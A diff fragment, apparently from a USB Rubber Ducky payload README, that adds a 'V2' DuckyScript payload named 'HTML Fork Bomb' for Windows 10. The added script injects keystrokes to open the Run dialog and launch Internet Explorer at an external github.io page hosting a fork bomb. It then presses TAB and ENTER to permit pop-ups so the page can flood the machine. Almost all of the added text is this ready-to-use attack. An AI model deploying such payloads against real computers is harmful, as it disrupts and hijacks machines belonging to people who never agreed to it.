@@ -20,7 +20,29 @@ TAB </BR>
 DELAY 200 </BR>
 ENTER </BR>
 
+</BR>
 
+<h3> V2 </h3>
+
+<br>
+
+<P> This Version it's optimized and worlk also for Win 10 </p>
+
+REM HTML Fork Bomb by Jonny Banana </BR>
+DELAY 2000 </BR>
+GUI R </BR>
+DELAY 200 </BR>
+REM this string of code has been optimized under the advice of Darren Kitchen
+REM https://github.com/hak5/usbrubberducky-payloads/pull/6
+STRING iexplore.exe https://jonnybanana.github.io/HTML-Fork-Bomb.github.io/ </BR>
+DELAY 200 </BR>
+ENTER </BR>
+REM set a long delay  to give time to this disgusting browser </BR>
+DELAY 1000 </BR>
+REM it's time to enable Pop-Up </BR>
+TAB </BR>
+DELAY 200 </BR>
+ENTER </BR>
 
 
 </BR>
